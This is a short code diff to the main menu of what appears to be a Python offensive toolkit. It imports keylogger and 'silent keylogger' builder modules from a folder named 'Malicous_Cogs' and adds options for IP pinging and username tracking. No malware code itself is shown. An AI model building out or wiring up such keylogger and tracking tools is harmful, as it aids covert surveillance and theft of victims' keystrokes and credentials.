@@ -1,9 +1,11 @@
+import asyncio
 import os
 import shutil
 from cogs.wbh import wbh
 from cogs.Malicous_Cogs.silent_keylogger_builder import Silent_KeyLogger
 from cogs.Malicous_Cogs.keylogger_builder import keylogger
-
+from cogs.ip_ping import ping_ip
+from cogs.username_tracker import Username_Tr
 
 def clear():
     if os.name == "nt":
@@ -45,7 +47,7 @@ class HelpFuncs:
     def help_reminder(self):
         if os.path.exists('hr.txt'):
             with open('hr.txt', "r") as f:
-                print(f.read())
+                print(f"{f.read()}\n")
         else:
             pass
 
@@ -81,7 +83,11 @@ def main():
         py2exe()
     elif option == "rhelp":
         os.remove("hr.py")
-        
+    elif option == "ip ping":
+        ping_ip()
+    elif option == "ut":
+        username_tracker = Username_Tr()
+        asyncio.run(username_tracker.track_username())
     else:
         print("Invalid command.")
         input("\nPress Enter to continue...")
